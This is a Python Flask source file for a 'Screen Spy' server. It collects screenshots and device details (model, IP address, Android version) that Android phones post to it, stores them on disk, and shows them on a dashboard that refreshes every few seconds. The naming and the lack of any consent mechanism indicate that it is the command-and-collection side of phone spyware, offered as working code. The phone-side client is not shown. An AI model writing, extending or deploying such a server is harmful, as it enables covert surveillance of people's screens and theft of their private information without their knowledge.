#!/usr/bin/env python3
# Screen Spy Web Server

from flask import Flask, request, jsonify, render_template_string
import base64
import json
import threading
from datetime import datetime
import os

app = Flask(__name__)

# Store screenshots in memory
screenshots = {}
clients = {}

# HTML Dashboard
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🔥 LIVE SCREEN SPY</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: white; font-family: monospace; }
        .header { background: #ff0000; padding: 20px; text-align: center; }
        .container { max-width: 1200px; margin: auto; padding: 20px; }
        .client-list { background: #1a1a1a; padding: 20px; margin: 20px 0; }
        .client { background: #2a2a2a; padding: 15px; margin: 10px 0; }
        .screen { max-width: 100%; border: 2px solid #ff0000; }
        .info { color: #00ff00; font-size: 14px; }
        .timestamp { color: #00aaff; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 LIVE SCREEN SPY DASHBOARD</h1>
        <p>Connected Clients: {{ clients|length }}</p>
    </div>
    
    <div class="container">
        {% for client_id, data in clients.items() %}
        <div class="client">
            <h3>📱 {{ data.device.model }} ({{ data.device.ip }})</h3>
            <p class="info">⚙️ Android {{ data.device.android }} | 🕒 {{ data.timestamp }}</p>
            {% if data.screenshot %}
            <img class="screen" src="data:image/jpeg;base64,{{ data.screenshot }}" width="800">
            {% endif %}
        </div>
        {% endfor %}
    </div>
    
    <script>
        // Auto-refresh every 3 seconds
        setTimeout(() => location.reload(), 3000);
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(HTML_TEMPLATE, clients=clients)

@app.route('/receive', methods=['POST'])
def receive_screen():
    try:
        data = request.get_json()
        
        # Extract data
        screenshot_b64 = data.get('image', '')
        device_info = data.get('device', {})
        timestamp = data.get('timestamp', 0)
        
        # Generate client ID
        client_ip = request.remote_addr
        client_id = f"{client_ip}_{device_info.get('model', 'unknown')}"
        
        # Store data
        clients[client_id] = {
            'screenshot': screenshot_b64,
            'device': device_info,
            'timestamp': datetime.fromtimestamp(timestamp/1000).strftime('%H:%M:%S'),
            'last_update': datetime.now().isoformat()
        }
        
        # Save to file (optional)
        save_screenshot(client_id, screenshot_b64, device_info)
        
        return jsonify({'status': 'success', 'client': client_id})
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def save_screenshot(client_id, screenshot_b64, device_info):
    """Save screenshot to file"""
    try:
        # Create directory
        os.makedirs('screenshots', exist_ok=True)
        
        # Save image
        image_data = base64.b64decode(screenshot_b64)
        filename = f"screenshots/{client_id}_{int(datetime.now().timestamp())}.jpg"
        
        with open(filename, 'wb') as f:
            f.write(image_data)
        
        # Save metadata
        metadata = {
            'client_id': client_id,
            'device': device_info,
            'timestamp': datetime.now().isoformat(),
            'filename': filename
        }
        
        with open(filename.replace('.jpg', '.json'), 'w') as f:
            json.dump(metadata, f, indent=2)
            
    except Exception as e:
        print(f"Save error: {e}")

@app.route('/screenshots')
def list_screenshots():
    """List all saved screenshots"""
    screenshots = []
    if os.path.exists('screenshots'):
        for file in os.listdir('screenshots'):
            if file.endswith('.json'):
                with open(f'screenshots/{file}', 'r') as f:
                    screenshots.append(json.load(f))
    
    return jsonify(screenshots)

def start_server():
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)

if __name__ == '__main__':
    print("""
🔥 SCREEN SPY SERVER v1.0
🌐 Server: http://0.0.0.0:5000
📱 Dashboard: http://localhost:5000
📡 Waiting for connections...
    """)
    start_server()
